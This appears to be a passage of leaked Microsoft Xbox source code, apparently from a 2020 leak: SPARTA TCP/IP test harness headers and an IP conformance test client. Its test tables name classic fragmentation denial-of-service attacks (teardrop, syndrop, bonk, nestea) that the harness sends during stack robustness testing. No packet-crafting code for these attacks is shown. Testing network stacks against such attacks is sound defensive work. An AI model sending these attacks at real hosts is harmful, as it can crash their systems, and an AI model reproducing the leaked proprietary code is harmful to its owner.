#include "sparta.h"
#include "packets.h"
#include "tcp.h"

#include "media.h"
#include "Parser.hpp"
#include "TCPOption.hpp"

#include "IPConstants.h"


class CTCPHeader
{
  friend class CTCPPacket;
  //friend class CTCPOption;
//  friend class CICMPHeader;

protected:

   pTCP_HDR_TYPE pTCPHeader; 
   PKT_BUFFER    m_TCPBuffer;
 
   AUTO_CAL_TYPES m_AutoChecksum;
   AUTO_CAL_TYPES m_AutoLength;
   
   USHORT  TotalOptionsLength;
public:

   CTCPOption Options[MAX_NO_TCP_OPTIONS];
   
   CTCPHeader();
   
   CTCPHeader(PVOID RawBuffer, DWORD RemainingLength,OUT PDWORD pdwProcessed);
	/**
		This Contructor is only used by icmp class when creating the tcp header as only eight
		bytes can provided for the the construction.
		In This case the rest of the bytes reading will result in zero getting returned
		dwRemainingLength will never be greater than the max bytes required to make a tcp packet.
		This will be ensured by who ever is calling this function
		dwRemainingLength will usually be eight.
	*/
	CTCPHeader::CTCPHeader(PVOID RawBuffer, PDWORD pdwRemainingLength,OUT PDWORD pdwProcessed);
   
   USHORT GetActualHdrLength();
   SPARTA_STATUS PrepareHdrForSend();
   
   
   SPARTA_STATUS SetSrcPort(const USHORT Port);
   
   SPARTA_STATUS SetDestPort(const USHORT Port);
   
   SPARTA_STATUS SetSeqNumber(const int SeqNumber);
   
   SPARTA_STATUS SetAckNumber(const int AckNumber);

   
   SPARTA_STATUS SetHdrLength(const USHORT Length);
   
   SPARTA_STATUS SetReserved(const USHORT Reserved);   
   
   SPARTA_STATUS SetFlag(const USHORT Flag);
   
   SPARTA_STATUS SetWindowSize(const USHORT WindowSize);
   
   SPARTA_STATUS SetChecksum(const USHORT Checksum);
   
   SPARTA_STATUS SetUrgentPointer(const USHORT UrgentPointer);
   
   SPARTA_STATUS SetAutoCalcChecksum(const AUTO_CAL_TYPES Status);
   SPARTA_STATUS SetAutoCalcLength(const AUTO_CAL_TYPES Status);
   
/*********************************************************************************
*                               Get Functions                                   *
*********************************************************************************/

   USHORT GetSrcPort();
   USHORT GetDstPort();
   int    GetSeqNumber();
   int    GetAckNumber();
   
   USHORT GetHdrLength();
   USHORT GetReserved();
   USHORT GetFlag();
   
   USHORT GetWindowSize();
   USHORT GetChecksum();
   USHORT GetUrgentPointer();

   AUTO_CAL_TYPES GetAutoCalcChecksum();
   AUTO_CAL_TYPES GetAutoCalcLength();


   void          Print();
   SPARTA_STATUS ProcessOptions(UCHAR* OptionPointer, USHORT TotalOptionsLength);

   /**++
        Routine Description:
                Returns the TCP internal buffer
                This is required as other classes using the the header has to chain
                the buffer in the buffer chain.
        -*/
        PKT_BUFFER GetRawBuffer();

        /**++
        Routine Description:
        Copies the first bwBytes bytes of the tcp header and returns the number of bytes copied
        if bwBytes is more than 8

        -*/
        SPARTA_STATUS CopyTCPHdrFrom(PVOID copyFrom, DWORD *bwBytes);


  //SPARTA_STATUS PreparePacketForSend(const USHORT IPTotalLength, const USHORT IPHeaderLength);
   
   ~CTCPHeader();

};


#endif // __SPARTA_TCP_HEADER_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\spartaexception.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: SpartaException.hpp                                                         *
* Description: this defines the Exceptions for this project                             *
*                                                                                       *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       jbekmann      2/16/2000    created                              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/

#ifndef __SPARTA_EXCPETION_H__
#define __SPARTA_EXCEPTION_H__

#include "sparta.h"
#include "packet.hpp"


class CSpartaException
{
protected:
    TCHAR *szExceptionMessage;
    SPARTA_STATUS Status;

public:
    CSpartaException()
    {
        // do nothing
        szExceptionMessage = NULL;
        Status = ERROR_GEN_FAILURE;
    }

    CSpartaException(SPARTA_STATUS status, TCHAR *szMsg)
    {
        szExceptionMessage = szMsg;
        Status = status;
    }

    TCHAR *GetMessage()
    {
        return szExceptionMessage;
    }

    SPARTA_STATUS GetStatus()
    {
        return Status;
    }


};

class CSpartaMallocException : public CSpartaException
{
public:

    CSpartaMallocException() : CSpartaException(ERROR_NOT_ENOUGH_MEMORY,
                                                TEXT("Memory Allocation Failure."))
    {
    }
};


class CSpartaTimeoutException : public CSpartaException
{
public:

    CSpartaTimeoutException() : CSpartaException(ERROR_TIMEOUT,
                                                    TEXT("Timeout period expired."))
    {
    }
};

class CSpartaInValidParameterException : public CSpartaException
{
public:

    CSpartaInValidParameterException() : CSpartaException(ERROR_INVALID_PARAMETER,
                                                    TEXT("The parameter is incorrect. "))
    {
    }
};

class CSpartaUnexpectedApiErrorException : public CSpartaException
{
public:
    CSpartaUnexpectedApiErrorException(SPARTA_STATUS status, TCHAR *szMsg) :
                                        CSpartaException(status,szMsg)
    {
    }
};

class CSpartaPacketParseException : public CSpartaException
{
public:
    CSpartaPacketParseException(SPARTA_STATUS status, TCHAR *szMsg) :
                                        CSpartaException(status,szMsg)
    {
    }
};

class CSpartaPacketReceiveException : public CSpartaException
{
public:

    CSpartaPacketReceiveException(SPARTA_STATUS status) : 
                        CSpartaException(status,TEXT("Error receiving packet."))
    {
    }

    CSpartaPacketReceiveException(SPARTA_STATUS status,
                                    TCHAR *szMsg) : CSpartaException(status,szMsg)
    {
    }

};

class CSpartaUnexpectedPacketReceivedException : public CSpartaPacketReceiveException
{
protected:
    CPacket *m_pPacket;
    BOOL m_fDontDeletePacket;

public:

    CSpartaUnexpectedPacketReceivedException(SPARTA_STATUS status) :
         CSpartaPacketReceiveException(status,TEXT("Unexpected Packet Type Received.")),
        m_pPacket(NULL),m_fDontDeletePacket(FALSE)
    {
    }

    CSpartaUnexpectedPacketReceivedException(SPARTA_STATUS status, CPacket *pPacket) :
         CSpartaPacketReceiveException(status,TEXT("Unexpected Packet Type Received.")),
        m_pPacket(pPacket),m_fDontDeletePacket(FALSE)
    {
    }

    ~CSpartaUnexpectedPacketReceivedException()
    {
        if(m_pPacket != NULL && m_fDontDeletePacket == FALSE)
        {
            delete m_pPacket;
        }
    }

    CPacket *CreatePacketReference()
    {
        m_fDontDeletePacket = TRUE;
        return m_pPacket;
    }

};

// ThrowOnErrorIfEnabled - checks to see whether status != ERROR_SUCCESS. If it is,
// it throws an CSpartaUnexpectedApiErrorException with that error code. 

VOID ThrowOnError(SPARTA_STATUS status, TCHAR *szMsg);

#endif // __SPARTA_EXCEPTION_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\tcppacket.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: TCPPacket.hpp                                                               *
* Description: this defines the TCP Packet class , extends the IP Packet                *
*               class                                                                   *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       balasha      3/20/2000    created                               *
*                       jbekmann      5/31/2000    made destructor virtual              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/


#ifndef __SPARTA_TCP_PACKET_H__
#define __SPARTA_TCP_PACKET_H__

#include "sparta.h"
#include "udp.h"
#include "IPHeader.hpp"
#include "Packet.hpp"
#include "TCPHeader.hpp"
#include "IPPacket.hpp"


class CTCPPacket : public CIPPacket
{
  
public:
   CTCPHeader & TCPHeader;

   CTCPPacket(PKT_PACKET Packet, CMacHeader &MacHeaderParam, CIPHeader &IPHeader, 
              CTCPHeader &TCPHeader, BOOL IsVersion6 = FALSE);
   CTCPPacket(MAC_MEDIA_TYPE MediaType, BOOL IsVersion6 = FALSE);
   SPARTA_STATUS PreparePacketForSend();
   USHORT GetHdrLength();
   USHORT CalcChecksum();
    
   BOOL VerifyChecksum();
   
   virtual ~CTCPPacket();

   virtual int GetPacketType();

   virtual void PrintPacket();

};

#endif //__SPARTA_UDP_PACKET_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\udp.h ===
#ifndef __SPARTA_UDP_H__
#define __SPARTA_UDP_H__

#pragma pack(push,origpack)

#pragma pack(1)

#define	PROTOCOL_UDP	17	// UDP protocol number
#define	UDP_MAX_HEADER_LENGTH	8	// UDP max header lenght

typedef struct  _tagUDPT_Header
{
	USHORT		uh_src;				// Source port.
	USHORT		uh_dest;			// Destination port.
	USHORT		uh_length;			// Length
	USHORT		uh_xsum;			// Checksum.
} UDP_HDR_TYPE, *pUDP_HDR_TYPE; //UDPHeader 


#pragma pack(pop,origpack)


#endif // __SPARTA_UDP_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\ip\inc\ipmsg.h ===
#ifndef __IPMSG_H__
#define __IPMSG_H__

//***************
//*** Defines ***
//***************

#define IPMSG_TESTREQ		NETSYNC_MSG_USER + 1
#define IPMSG_TESTACK		NETSYNC_MSG_USER + 2
#define IPMSG_TESTDONE		NETSYNC_MSG_USER + 3

#define PROTOCOL_UDP		17

#define UDPHEADER_SIZE		8
#define	IPHEADER_SIZE		20

//****************
//*** Typedefs ***
//****************

// IP test case IDs
typedef enum _IPMSG_TESTTYPES
{
	// Tests for version field
	IPMSG_VERSION_SIX,
	IPMSG_VERSION_BAD,

	// Tests for header length field
	IPMSG_HEADLEN_BELOWMIN,
	IPMSG_HEADLEN_MAX,
	IPMSG_HEADLEN_ABOVETOTALLEN,
	IPMSG_HEADLEN_ABOVEAVAIL,

	// Tests for type-of-service
	IPMSG_TOS_NORMAL,
	IPMSG_TOS_NETCONTROL,
	IPMSG_TOS_LOWDELAY,
	IPMSG_TOS_HIGHTHROUGH,
	IPMSG_TOS_HIGHRELI,
	IPMSG_TOS_RESERVED,

	// Tests for total length
	IPMSG_LENGTH_BELOWMIN,
	IPMSG_LENGTH_ATMIN,
	IPMSG_LENGTH_ABOVEMIN,
	IPMSG_LENGTH_ABOVETOTAL,
	IPMSG_LENGTH_BELOWTOTAL,
	IPMSG_LENGTH_MAX,

	// Tests for ID
	IPMSG_ID_MIN,
	IPMSG_ID_MAX,

	// Tests for flags
	IPMSG_FLAG_RESERVEDSET,
	IPMSG_FLAG_DFANDMF,

	// Tests for time-to-live
	IPMSG_TTL_MIN,
	IPMSG_TTL_MAX,

	// Tests for protocol
	IPMSG_PRO_UNSUP,
	IPMSG_PRO_ICMP_TOOSMALL,
	IPMSG_PRO_IGMP_TOOSMALL,
	IPMSG_PRO_TCP_TOOSMALL,
	IPMSG_PRO_UDP_TOOSMALL,
	IPMSG_PRO_UNSUP_TOOSMALL,

	// Tests for checksum
	IPMSG_CHECKSUM_BAD,

	// Tests for options
	IPMSG_OPT_ABOVEAVAIL,
	IPMSG_OPT_EXACTSIZE,
	IPMSG_OPT_ENDOFOPSLAST,
	IPMSG_OPT_ENDOFOPSFIRST,

	// Tests for fragmentation
	IPMSG_FRAG_MAXSIMREASM,
	IPMSG_FRAG_ABOVEMAXSIMREASM,
	IPMSG_FRAG_FULLREVERSE,
	IPMSG_FRAG_MIDREVERSE,
	IPMSG_FRAG_LASTINSECOND,
	IPMSG_FRAG_MIXEDSIZE,
	IPMSG_FRAG_HUNDRED,
	IPMSG_FRAG_MULTILASTFRAG,
	IPMSG_FRAG_OVERLAPPING,
	IPMSG_FRAG_MAXDGRAMSIZE,
	IPMSG_FRAG_MAXREASMSIZE,
	IPMSG_FRAG_ABOVEMAXREASMSIZE,
	IPMSG_FRAG_OVERSIZED,

	// Net attacks
	IPMSG_ATTACK_TEARDROP,
	IPMSG_ATTACK_NEWTEAR,
	IPMSG_ATTACK_IMPTEAR,
	IPMSG_ATTACK_SYNDROP,
	IPMSG_ATTACK_BONK,
	IPMSG_ATTACK_ZEROLENOPT,
	IPMSG_ATTACK_NESTEA,

	IPMSG_MAXTEST
} IPMSG_TESTTYPES, *PIPMSG_TESTTYPES;

// IP test request packet
typedef struct _IP_TESTREQ {
    DWORD				dwMessageId;	// Specifies the message id
	IPMSG_TESTTYPES		TestId;			// Specifies the test requested
	CHAR				MacAddr[16];	// Specifies the MAC address of the client (make size a multiple of 4)
} IP_TESTREQ, *PIP_TESTREQ;

// IP test request ack
typedef struct _IP_TESTACK {
    DWORD				dwMessageId;	// Specifies the message id
	IPMSG_TESTTYPES		TestId;			// Specifies the test requested
} IP_TESTACK, *PIP_TESTACK;

#endif
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\inc\udppacket.hpp ===
/****************************************************************************************
*                                    SPARTA project                                     *
*                                                                                       *
* (TCP/IP test team)                                                                    *
*                                                                                       *
* Filename: UDPPacket.hpp                                                               *
* Description: this defines the UDP Packet class , extends the IP Packet                *
*               class                                                                   *
*                                                                                       *
* Revision history:     name          date         modifications                        *
*                                                                                       *
*                       balasha      3/20/2000    created                               *
*                       jbekmann      5/31/2000    made destructor virtual              *
*                                                                                       *
*                                                                                       *
*                (C) Copyright Microsoft Corporation 1999-2000                          *
*****************************************************************************************/


#ifndef __SPARTA_UDP_PACKET_H__
#define __SPARTA_UDP_PACKET_H__

#include "sparta.h"
#include "udp.h"
#include "IPHeader.hpp"
#include "Packet.hpp"
#include "UDPHeader.hpp"
#include "IPPacket.hpp"


class CUDPPacket : public CIPPacket
{

public:
    CUDPHeader &UDPHeader;

    CUDPPacket(MAC_MEDIA_TYPE MediaType, BOOL IsVersion6 = FALSE);
    CUDPPacket(PKT_PACKET Packet, CMacHeader &MacHeaderParam, 
               CIPHeader &IPHeader, CUDPHeader &UDPHeader, BOOL IsVersion6 = FALSE);
    SPARTA_STATUS PreparePacketForSend();
    USHORT CalcChecksum();
    virtual ~CUDPPacket();

    virtual int GetPacketType();

    virtual void PrintPacket();

};

#endif //__SPARTA_UDP_PACKET_H__
=== C:/Users/treeman/Desktop/windows nt source code\xbox\xbox_leak_may_2020\xbox trunk\xbox\private\test\network\tcpip\sparta\ip\client\iptest.cpp ===
//==================================================================================
// Includes
//==================================================================================
#include "iptest.h"

//==================================================================================
// Globals
//==================================================================================

// Define harness stuff
#pragma data_seg( EXPORT_SECTION_NAME )
DECLARE_EXPORT_DIRECTORY( iptest )
#pragma data_seg()

// Define export table for harness
BEGIN_EXPORT_TABLE( iptest )
    EXPORT_TABLE_ENTRY( "StartTest", IpTestStartTest )
    EXPORT_TABLE_ENTRY( "EndTest", IpTestEndTest )
    EXPORT_TABLE_ENTRY( "DllMain", IpTestDllMain )
END_EXPORT_TABLE( iptest )

// Test specific globals
static CRITICAL_SECTION g_csSerializeAccess;
static HANDLE g_hLog = INVALID_HANDLE_VALUE;
static PIP_TEST_FUNCTION	g_TestFunctions[IPMSG_MAXTEST] = 
{
	IPVersionSixTest,												// IPMSG_VERSION_SIX,
	IPVersionBadTest,												// IPMSG_VERSION_BAD,
	IPHeaderLenBelowMinTest,										// IPMSG_HEADLEN_BELOWMIN,
	IPHeaderLenMaxTest,												// IPMSG_HEADLEN_MAX,
	IPHeaderLenAboveTotalLenTest,									// IPMSG_HEADLEN_ABOVETOTALLEN,
	IPHeaderLenAboveAvailTest,										// IPMSG_HEADLEN_ABOVEAVAIL,
	IPTosNormalTest,												// IPMSG_TOS_NORMAL,
	IPTosNetControlTest,											// IPMSG_TOS_NETCONTROL,
	IPTosLowDelayTest,												// IPMSG_TOS_LOWDELAY,
	IPTosHighThroughputTest,										// IPMSG_TOS_HIGHTHROUGH,
	IPTosHighReliabilityTest,										// IPMSG_TOS_HIGHRELI,
	IPTosReservedTest,												// IPMSG_TOS_RESERVED,
	IPLengthBelowMinTest,											// IPMSG_LENGTH_BELOWMIN,
	IPLengthAtMinTest,												// IPMSG_LENGTH_ATMIN,
	IPLengthAboveMinTest,											// IPMSG_LENGTH_ABOVEMIN,
	IPLengthAboveTotalTest,											// IPMSG_LENGTH_ABOVETOTAL,
	IPLengthBelowTotalTest,											// IPMSG_LENGTH_BELOWTOTAL,
	IPLengthMaxTest,												// IPMSG_LENGTH_MAXIMUM,
	IPIDMinTest,													// IPMSG_ID_MIN,
	IPIDMaxTest,													// IPMSG_ID_MAX,
	IPFlagReservedSetTest,											// IPMSG_FLAG_RESERVEDSET,
	IPFlagDontFragAndMoreFragsTest,									// IPMSG_FLAG_DFANDMF,
	IPTtlMinTest,													// IPMSG_TTL_MIN,
	IPTtlMaxTest,													// IPMSG_TTL_MAX,
	IPProtocolUnsupportedTest,										// IPMSG_PRO_UNSUP,
	IPProtocolICMPTooSmallTest,										// IPMSG_PRO_ICMP_TOOSMALL,
	IPProtocolIGMPTooSmallTest,										// IPMSG_PRO_IGMP_TOOSMALL,
	IPProtocolTCPTooSmallTest,										// IPMSG_PRO_TCP_TOOSMALL,
	IPProtocolUDPTooSmallTest,										// IPMSG_PRO_UDP_TOOSMALL,
	IPProtocolUnsupportedTooSmallTest,								// IPMSG_PRO_UNSUP_TOOSMALL,
	IPChecksumBadTest,												// IPMSG_CHECKSUM_BAD,
	IPOptionsAboveAvailTest,										// IPMSG_OPT_ABOVEAVAIL,
	IPOptionsExactSizeTest,											// IPMSG_OPT_EXACTSIZE,
	IPOptionsEndOfOpsLastTest,										// IPMSG_OPT_ENDOFOPSLAST,
	IPOptionsEndOfOpsFirstTest,										// IPMSG_OPT_ENDOFOPSFIRST,
	IPFragMaxSimulReassemblyTest,									// IPMSG_FRAG_MAXSIMREASM,
	IPFragAboveMaxSimulReassemblyTest,								// IPMSG_FRAG_ABOVEMAXSIMREASM,
	IPFragFullReverseTest,											// IPMSG_FRAG_FULLREVERSE,
	IPFragMidReverseTest,											// IPMSG_FRAG_MIDREVERSE,
	IPFragLastInSecondTest,											// IPMSG_FRAG_LASTINSECOND,
	IPFragMixedSizeTest,											// IPMSG_FRAG_MIXEDSIZE,
	IPFragOneHundredTest,											// IPMSG_FRAG_HUNDRED,
	IPFragMultipleLastFragmentTest,									// IPMSG_FRAG_MULTILASTFRAG,
	IPFragOverlappingFragmentsTest,									// IPMSG_FRAG_OVERLAPPING,
	IPFragMaxDatagramSizeTest,										// IPMSG_FRAG_MAXDGRAMSIZE,
	IPFragMaxReassemblySizeTest,									// IPMSG_FRAG_MAXREASMSIZE,
	IPFragAboveMaxReassemblySizeTest,								// IPMSG_FRAG_ABOVEMAXREASMSIZE,
	IPFragOversizedFragmentsTest,									// IPMSG_FRAG_OVERSIZED,
	IPAttackTeardropTest,											// IPMSG_ATTACK_TEARDROP,
	IPAttackNewTeardropTest,										// IPMSG_ATTACK_NEWTEAR,
	IPAttackImpTeardropTest,										// IPMSG_ATTACK_IMPTEAR,
	IPAttackSynDropTest,											// IPMSG_ATTACK_SYNDROP,
	IPAttackBonkTest,												// IPMSG_ATTACK_BONK,
	IPAttackZeroLenOptTest,											// IPMSG_ATTACK_ZEROLENOPT,
	IPAttackNesteaTest												// IPMSG_ATTACK_NESTEA,
};

static LPSTR g_TestNames[IPMSG_MAXTEST] = 
{
	"IP version six",												// IPMSG_VERSION_SIX,
	"IP unknown version",											// IPMSG_VERSION_BAD,
	"IP header length below minimum",								// IPMSG_HEADLEN_BELOWMIN,
	"IP header length maximum",										// IPMSG_HEADLEN_MAX,
	"IP header length above total length",							// IPMSG_HEADLEN_ABOVETOTALLEN,
	"IP header length above total available",						// IPMSG_HEADLEN_ABOVEAVAIL,
	"IP normal type-of-service",									// IPMSG_TOS_NORMAL,
	"IP NetControl type-of-service",								// IPMSG_TOS_NETCONTROL,
	"IP low-delay type-of-service",									// IPMSG_TOS_LOWDELAY,
	"IP high-throughput type-of-service",							// IPMSG_TOS_HIGHTHROUGH,
	"IP high-reliability type-of-service",							// IPMSG_TOS_HIGHRELI,
	"IP reserved type-of-service",									// IPMSG_TOS_HIGHRELI,
	"IP length below minimum",										// IPMSG_LENGTH_BELOWMIN,
	"IP length at minimum",											// IPMSG_LENGTH_ATMIN,
	"IP length above minimum",										// IPMSG_LENGTH_ABOVEMIN,
	"IP length above total",										// IPMSG_LENGTH_ABOVETOTAL,
	"IP length below total",										// IPMSG_LENGTH_BELOWTOTAL,
	"IP length maximum", 											// IPMSG_LENGTH_MAXIMUM,
	"IP ID minimum",												// IPMSG_ID_MIN,
	"IP ID maximum",												// IPMSG_ID_MAX,
	"IP reserved flag set",											// IPMSG_FLAG_RESERVEDSET,
	"IP don't fragment and more fragments",							// IPMSG_FLAG_DFANDMF,
	"IP time-to-live minimum",										// IPMSG_TTL_MIN,
	"IP time-to-live maximum",										// IPMSG_TTL_MAX,
	"IP protocol unsupported",										// IPMSG_PRO_UNSUP,
	"IP ICMP packet too small",										// IPMSG_PRO_ICMP_TOOSMALL,
	"IP IGMP packet too small",										// IPMSG_PRO_IGMP_TOOSMALL,
	"IP TCP packet too small",										// IPMSG_PRO_TCP_TOOSMALL,
	"IP UDP packet too small",										// IPMSG_PRO_UDP_TOOSMALL,
	"IP unsupported packet too small",								// IPMSG_PRO_UNSUP_TOOSMALL,
	"IP checksum bad",												// IPMSG_CHECKSUM_BAD,
	"IP options size above avail",									// IPMSG_OPT_ABOVEAVAIL,
	"IP options size exactly avail",								// IPMSG_OPT_EXACTSIZE,
	"IP options end-of-options last",								// IPMSG_OPT_ENDOFOPSLAST,
	"IP options end-of-options first",								// IPMSG_OPT_ENDOFOPSFIRST,
	"IP max simultaneous reassembly",								// IPMSG_FRAG_MAXSIMREASM,
	"IP above max simultaneous reassembly",							// IPMSG_FRAG_ABOVEMAXSIMREASM,
	"IP fragments completely reversed",								// IPMSG_FRAG_FULLREVERSE,
	"IP fragments middle two reversed",								// IPMSG_FRAG_MIDREVERSE,
	"IP fragments last fragment second",							// IPMSG_FRAG_LASTINSECOND,
	"IP fragments mixed size",										// IPMSG_FRAG_MIXEDSIZE,
	"IP one-hundred-fragments",										// IPMSG_FRAG_HUNDRED,
	"IP multiple last fragments",									// IPMSG_FRAG_MULTILASTFRAG,
	"IP overlapping fragments",										// IPMSG_FRAG_OVERLAPPING,
	"IP fragments max datagram size",								// IPMSG_FRAG_MAXDGRAMSIZE,
	"IP max fragment reassembly size",								// IPMSG_FRAG_MAXREASMSIZE,
	"IP above max fragment reassembly size",						// IPMSG_FRAG_ABOVEMAXREASMSIZE,
	"IP frags larger buf than hdr claims",							// IPMSG_FRAG_OVERSIZED,
	"IP teardrop attack",											// IPMSG_ATTACK_TEARDROP,
	"IP new teardrop attack",										// IPMSG_ATTACK_NEWTEAR,
	"IP improved teardrop attack",									// IPMSG_ATTACK_IMPTEAR,
	"IP syndrop attack",											// IPMSG_ATTACK_SYNDROP,
	"IP bonk attack",												// IPMSG_ATTACK_BONK,
	"IP with zero length option attack",							// IPMSG_ATTACK_ZEROLENOPT,
	"IP nestea attack"												// IPMSG_ATTACK_NESTEA,
};

//==================================================================================
// IpTestDllMain
//----------------------------------------------------------------------------------
//
// Description: DLL entry
//
// Arguments:
//	HINSTANCE	hInstance		Handle to module
//	DWORD		dwReason		Indicates the reason for calling the function
//	LPVOID		lpContext		reserved
// Returns:
//	TRUE on success
//==================================================================================
BOOL WINAPI IpTestDllMain(IN HINSTANCE hInstance, IN DWORD     dwReason, IN LPVOID    lpContext)
{
	// We'll initialize/delete the global critical section here
	switch(dwReason)
	{
	case DLL_PROCESS_ATTACH:
		XNetAddRef();
		InitializeCriticalSection(&g_csSerializeAccess);
		break;
	case DLL_PROCESS_DETACH:
		XNetRelease();
		DeleteCriticalSection(&g_csSerializeAccess);
		break;
	default:
		break;
	}

    return TRUE;
}

//==================================================================================
// IpTestStartTest
//----------------------------------------------------------------------------------
//
// Description: Test entry point
//
// Arguments:
//	HANDLE		hLog			Handle to logging subsystem
// Returns:
//	none
//==================================================================================
VOID WINAPI IpTestStartTest(IN HANDLE  hLog)
{
	NETSYNC_TYPE_CALLBACK CallbackSessionInfo;
	IP_TESTREQ TestRequest;
	IN_ADDR ServerAddr;
    WSADATA WSAData;
	HANDLE hClientObject = NULL;
	DWORD dwTestDone;
	WORD LowPort, HighPort;
	INT i = 0, j = 0, nRet = 0;
	BYTE   MacAddr[6];
	DWORD  dwType = 0, dwSize = 0, dwErrorCode = 0;

	// Since we have to be thread safe, serialize entry for now
	EnterCriticalSection(&g_csSerializeAccess);

	g_hLog = hLog;

    // Set XLog info
	xSetOwnerAlias(g_hLog, "tristanj");
    xSetComponent(g_hLog, "Network(S)", "TCP/IP (S-n)");
	xSetFunctionName(g_hLog, "recvfrom");

    // Init winsock
    if(nRet = WSAStartup(MAKEWORD(2, 2), &WSAData))
	{
		xLog(g_hLog, XLL_FAIL, "Couldn't init winsock: %d", nRet);
		goto Exit;
	}

	xLog(g_hLog, XLL_INFO, "Winsock layer initialized");

	// Get the mac address
	dwErrorCode = XQueryValue(XC_FACTORY_ETHERNET_ADDR, &dwType, MacAddr, sizeof(MacAddr), &dwSize);
	if (ERROR_SUCCESS != dwErrorCode) {
		xLog(g_hLog, XLL_FAIL, "Couldn't get ethernet address: 0x%08x", dwErrorCode);
		goto Exit;
	}

	sprintf(TestRequest.MacAddr, "_%02x%02x%02x%02x%02x%02x",
		MacAddr[0], MacAddr[1], MacAddr[2], MacAddr[3], MacAddr[4], MacAddr[5]);
	xLog(g_hLog, XLL_INFO, "Local ethernet address: %s", TestRequest.MacAddr);

	// Prepare to find a server that can run the IP tests
	CallbackSessionInfo.byMinClientCount = 0;
	CallbackSessionInfo.byMaxClientCount = 0;
	CallbackSessionInfo.nMinPortCount = 1;
	CallbackSessionInfo.lpszDllName_W = IP_SERVER_DLL_W;
	CallbackSessionInfo.lpszMainFunction_A = IP_SERVER_MAIN_FUNCTION_A;
	CallbackSessionInfo.lpszStartFunction_A = IP_SERVER_START_FUNCTION_A;
	CallbackSessionInfo.lpszStopFunction_A = IP_SERVER_STOP_FUNCTION_A;

	// Create a client to communicate with that server
	hClientObject = NetsyncCreateClient(0, NETSYNC_SESSION_CALLBACK, &CallbackSessionInfo, &ServerAddr.S_un.S_addr, NULL, &LowPort, &HighPort);
	if (hClientObject == INVALID_HANDLE_VALUE)
	{
		xLog(g_hLog, XLL_FAIL, "Couldn't create Netsync client");
		goto Exit;
	}

	DbgPrint("IPTEST: Starting tests...\n");

	// Run the tests
	for(i = 0; i < IPMSG_MAXTEST; ++i)
	{
		IN_ADDR FromAddr;
		DWORD dwReceiveStatus, dwSendResult;
		
		TestRequest.dwMessageId = IPMSG_TESTREQ;
		TestRequest.TestId = (IPMSG_TESTTYPES) i;
		
		xStartVariation(g_hLog, g_TestNames[i]);
		xLog(g_hLog, XLL_INFO, "Started test %u", i);
		
		// Send the test request to the Netsync server
		dwSendResult = NetsyncSendClientMessage(hClientObject, 0, sizeof(IP_TESTREQ), (char *) &TestRequest);
		if(dwSendResult != WAIT_OBJECT_0)
		{
			xLog(g_hLog, XLL_INFO, "Error sending message to TCP server");
			DbgPrint("IPTEST: Error during test, aborting...\n");
			goto Exit;
		}

		// If we get here, then the Netsync server successfully acked the test.
		// Now run the client side of the test
		
		if(g_TestFunctions[i](LowPort, HighPort))
			xLog(g_hLog, XLL_PASS, "Test passed!");
		else
			xLog(g_hLog, XLL_FAIL, "Test failed!");
		
		xEndVariation(g_hLog);

		Sleep(5000);
	}
	
	DbgPrint("IPTEST: Tests complete\n");

Exit:

	// Tell the netsync server we're done
	dwTestDone = IPMSG_TESTDONE;
	NetsyncSendClientMessage(hClientObject, 0, 4, (char *) &dwTestDone);

	hClientObject ? NetsyncCloseClient(hClientObject) : 0;

	// Clean up winsock
	xLog(g_hLog, XLL_INFO, "Cleaning up Winsock layer");
	WSACleanup();

	g_hLog = INVALID_HANDLE_VALUE;

	// Allow other threads to enter now
	LeaveCriticalSection(&g_csSerializeAccess);

}            

//==================================================================================
// IpTestEndTest
//----------------------------------------------------------------------------------
//
// Description: Test exit point
//
// Arguments:
//	none
// Returns:
//	none
//==================================================================================
VOID WINAPI IpTestEndTest()
{
	// We already cleaned up everything at the end of StartTest
}

//==================================================================================
// IsSocketReady
//----------------------------------------------------------------------------------
//
// Description: Creates a listening socket and accepts a connection
//
// Arguments:
//	SOCKET			Socket				Socket to monitor for a given state
//	SOCKET_STATE	SocketState			State to monitor for
// Returns:
//	Returns TRUE if the activity has occured, FALSE otherwise
//==================================================================================
static BOOL IsSocketReady(SOCKET Socket, SOCKET_STATE SocketState, DWORD dwSecondsToWait)
{
	fd_set SocketCollection, *ReadCollection, *WriteCollection, *ExceptCollection;
	timeval TimeOut = {0,0}, *pTimeOut = NULL;

	// If we have a bad socket, just report FALSE
	if(Socket == INVALID_SOCKET)
		return FALSE;

	if(dwSecondsToWait != TIME_INFINITY)
	{
		TimeOut.tv_sec = dwSecondsToWait;
		pTimeOut = &TimeOut;
	}

	FD_ZERO(&SocketCollection);
	FD_SET(Socket, &SocketCollection);

	// Depending on the activity to monitor for, setup the parameters to select
	switch(SocketState)
	{
	case READABLE:
		ReadCollection = &SocketCollection;
		WriteCollection = NULL;
		ExceptCollection = NULL;
		break;
	case WRITEABLE:
		ReadCollection = NULL;
		WriteCollection = &SocketCollection;
		ExceptCollection = NULL;
		break;
	default:
		ReadCollection = NULL;
		WriteCollection = NULL;
		ExceptCollection = &SocketCollection;
		break;
	}

	if((select(1, ReadCollection, WriteCollection, ExceptCollection, pTimeOut)) != 1)
		return FALSE;
	else
		return TRUE;
}

//==================================================================================
// ReceiveIPPacket
//----------------------------------------------------------------------------------
//
// Description: Test that receives a IP packet with with a certain set of properties
//
// Arguments:
//	WORD			LocalPort			Port to receive the packet on
